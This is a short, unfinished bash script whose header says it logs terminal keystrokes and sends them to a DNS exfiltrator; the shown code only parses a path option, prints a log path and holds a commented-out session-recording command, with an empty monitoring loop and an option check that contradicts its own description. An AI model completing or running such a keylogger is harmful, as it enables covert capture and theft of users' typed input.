#!/bin/bash
# Log terminal keystrokes and send to dns exfiltrator
# Usage: command [-options]
# Options:
#   -p path: give path to log file to listen to

# globals/constants
log_file_path="/tmp/file-$(date +%s).log"

# check command line options
while [ $# -gt 0 ]; do
  # check if server is on localhost
  if [ $1 = "-p" ]; then
    if ! [ -n "$2" ]; then
      echo "You must specify a directory when using the -p option"
      exit 1
    fi
    log_file_path="$2"
    if ! [ -d "$log_file_path" ]; then
      echo "Directory does not exist"
      exit 1
    fi
  else
    # if it isn't an option, break out of the loop
    break
  fi
  shift
done

echo $log_file_path
# script -f -q -O "$log_file_path" && exit



# loop to check for file changes on the log output


exit 0